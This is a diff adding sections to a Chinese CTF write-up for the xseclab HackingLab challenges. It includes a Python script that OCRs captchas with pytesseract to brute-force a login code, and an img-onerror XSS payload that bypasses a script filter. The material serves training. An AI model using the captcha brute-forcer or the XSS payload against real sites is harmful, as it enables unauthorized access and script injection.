@@ -206,3 +206,78 @@ while True:
 <img src="/images/writeup10_2.png" />
 
 Get Key!
+
+<h6>[第十一关]</h6>
+
+这里就需要利用pytesseract来对验证码进行识别，从而暴力破解。
+
+{% highlight python %}
+#coding:utf-8
+
+import requests
+import pytesseract
+from PIL import Image
+
+def xcode(code,cookie):
+	fobj = open('test.png','wb')
+	ucode = requests.get(code,cookies=cookie)
+	for l in ucode.content:
+		fobj.writelines(l)
+	fobj.close()
+	im = Image.open('test.png')
+
+	text = pytesseract.image_to_string(im)
+	text = text.replace(" ",'')
+
+	if text.isdigit() and len(text)==4:
+		return text
+	else:
+		return xcode(code,cookie)
+
+if __name__ == '__main__':
+		
+	url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php'
+	code = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'
+
+	username = '13388886666'
+	submit = 'submit'
+
+	vcode = 100
+
+	cookie = {'PHPSESSID':'4d504a3e36f8dfe900dd7920cb26e8ee'}
+	while True:
+		
+		text = xcode(code,cookie)
+		post = {"username":username,'mobi_code':vcode,'user_code':text,'Login':submit}
+
+		res = requests.post(url,data=post,cookies=cookie)
+
+		print res.content,'...',vcode,text
+		vcode += 1
+
+		if 'key'  in res.content:
+			break
+
+{% endhighlight %}
+
+在破解的时候，需要用到cookies。加上就ok了。
+
+<img src="/images/writeup_11.png" alt="">
+
+Get Key!
+
+<h6>[第十二关]</h6>
+
+简单的xss，没有任何过滤。
+
+<img src="/images/writeup_12.png" alt="">
+
+Get Key!
+
+<h6>[第十二关]</h6>
+
+这一关对 **script**  进行了过滤，那么可用其他：'<img src="#" onerror=alert(HackingLab)>'
+
+<img src="/images/writeup_13.png" alt="">
+
+Get Key!
